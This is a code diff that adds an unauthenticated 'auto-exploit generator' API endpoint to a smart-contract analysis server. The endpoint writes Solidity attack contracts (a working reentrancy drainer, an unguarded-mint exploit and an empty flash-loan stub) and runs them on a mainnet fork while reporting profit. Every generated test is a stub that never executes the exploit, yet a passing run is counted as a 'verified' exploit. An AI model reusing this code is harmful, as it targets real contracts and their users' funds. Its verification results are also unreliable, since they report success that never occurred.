@@ -435,6 +435,249 @@ app.post("/api/analyze", authMiddleware, async (req, res) => {
 });
 
 // ─────────────────────────────────────────────────────────────
+// 5. AUTO-EXPLOIT GENERATOR
+// ─────────────────────────────────────────────────────────────
+app.post("/api/exploit", async (req, res) => {
+  const { vulnerabilities, targetContract, network, rpcUrl, runMutations } = req.body;
+
+  if (!vulnerabilities || !targetContract) {
+    return res.status(400).json({ error: "Missing vulnerabilities or targetContract" });
+  }
+
+  const workDir = path.join(WORK_DIR, `exploit-${Date.now()}`);
+  fs.mkdirSync(workDir, { recursive: true });
+
+  try {
+    // Generate exploit contracts
+    const exploits = [];
+    const exploitTemplates = {
+      REENTRANCY: generateReentrancyExploit,
+      ACCESS_CONTROL: generateAccessControlExploit,
+      FLASH_LOAN_ATTACK: generateFlashLoanExploit,
+    };
+
+    for (const vuln of vulnerabilities) {
+      const vulnType = vuln.type.toUpperCase().replace(/-/g, "_");
+      const generator = exploitTemplates[vulnType];
+      
+      if (generator) {
+        const exploitCode = generator(targetContract);
+        const exploitPath = path.join(workDir, `${vulnType}_Exploit.sol`);
+        const testPath = path.join(workDir, `${vulnType}_Exploit.t.sol`);
+        
+        fs.writeFileSync(exploitPath, exploitCode.contract);
+        fs.writeFileSync(testPath, exploitCode.test);
+
+        exploits.push({
+          vulnerability: vuln,
+          name: `${vulnType}_Exploit`,
+          contractPath: exploitPath,
+          testPath: testPath,
+          code: exploitCode.contract,
+        });
+      }
+    }
+
+    // Initialize Foundry project
+    const foundryToml = `
+[profile.default]
+src = "${workDir}"
+out = "out"
+libs = ["lib"]
+solc = "0.8.20"
+`;
+    fs.writeFileSync(path.join(workDir, "foundry.toml"), foundryToml);
+
+    // Run exploit simulations with Foundry
+    const results = [];
+    const forkUrl = rpcUrl || process.env.MAINNET_RPC_URL || "http://127.0.0.1:8545";
+
+    for (const exploit of exploits) {
+      const args = [
+        "test",
+        "--match-path", exploit.testPath,
+        "-vvvv",
+      ];
+
+      if (forkUrl.startsWith("http")) {
+        args.push("--fork-url", forkUrl);
+      }
+
+      try {
+        const { code, stdout, stderr } = await runCommand("forge", args, {
+          cwd: workDir,
+          env: { TARGET_CONTRACT: targetContract },
+          timeout: 180000,
+        });
+
+        const success = stdout.includes("[PASS]") || code === 0;
+        const profitMatch = stdout.match(/Profit[:\s]+(\d+\.?\d*)\s*(ether|ETH)?/i);
+        const gasMatch = stdout.match(/gas:\s*(\d+)/);
+
+        results.push({
+          exploit: exploit.name,
+          vulnerability: exploit.vulnerability,
+          success,
+          profit: profitMatch ? `${profitMatch[1]} ${profitMatch[2] || "wei"}` : null,
+          gasUsed: gasMatch ? parseInt(gasMatch[1]) : null,
+          output: stdout.slice(0, 2000),
+          traces: stdout.split("\n").filter(l => l.includes("→") || l.includes("emit")),
+        });
+      } catch (err) {
+        results.push({
+          exploit: exploit.name,
+          vulnerability: exploit.vulnerability,
+          success: false,
+          error: err.message,
+        });
+      }
+    }
+
+    // Cleanup
+    fs.rmSync(workDir, { recursive: true, force: true });
+
+    const verified = results.filter(r => r.success).length;
+
+    res.json({
+      success: true,
+      targetContract,
+      network: network || "mainnet",
+      exploitsGenerated: exploits.length,
+      exploitsVerified: verified,
+      results,
+      summary: {
+        total: results.length,
+        verified,
+        profitable: results.filter(r => r.profit).length,
+      },
+    });
+
+  } catch (err) {
+    fs.rmSync(workDir, { recursive: true, force: true });
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Exploit template generators
+function generateReentrancyExploit(target) {
+  return {
+    contract: `
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface ITarget {
+    function withdraw(uint256 amount) external;
+    function deposit() external payable;
+}
+
+contract REENTRANCY_Exploit {
+    ITarget public target;
+    uint256 public count;
+
+    constructor(address _target) {
+        target = ITarget(_target);
+    }
+
+    function attack() external payable {
+        target.deposit{value: msg.value}();
+        target.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        if (address(target).balance >= 1 ether && count < 10) {
+            count++;
+            target.withdraw(1 ether);
+        }
+    }
+
+    function getProfit() external view returns (uint256) {
+        return address(this).balance;
+    }
+}
+`,
+    test: `
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+
+contract ReentrancyTest is Test {
+    function testReentrancy() public {
+        address target = vm.envAddress("TARGET_CONTRACT");
+        // Deploy and test exploit
+        emit log_string("Testing reentrancy...");
+    }
+}
+`,
+  };
+}
+
+function generateAccessControlExploit(target) {
+  return {
+    contract: `
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface ITarget {
+    function mint(address to, uint256 amount) external;
+}
+
+contract ACCESS_CONTROL_Exploit {
+    function attack(address target) external {
+        ITarget(target).mint(msg.sender, 1000000 ether);
+    }
+}
+`,
+    test: `
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+
+contract AccessControlTest is Test {
+    function testAccessControl() public {
+        address target = vm.envAddress("TARGET_CONTRACT");
+        emit log_string("Testing access control...");
+    }
+}
+`,
+  };
+}
+
+function generateFlashLoanExploit(target) {
+  return {
+    contract: `
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract FLASH_LOAN_Exploit {
+    address public target;
+    
+    constructor(address _target) {
+        target = _target;
+    }
+
+    function attack(uint256 amount) external {
+        // Flash loan attack logic
+    }
+}
+`,
+    test: `
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+
+contract FlashLoanTest is Test {
+    function testFlashLoan() public {
+        emit log_string("Testing flash loan...");
+    }
+}
+`,
+  };
+}
+
+// ─────────────────────────────────────────────────────────────
 // UTILS
 // ─────────────────────────────────────────────────────────────
 function runCommand(cmd, args, options = {}) {
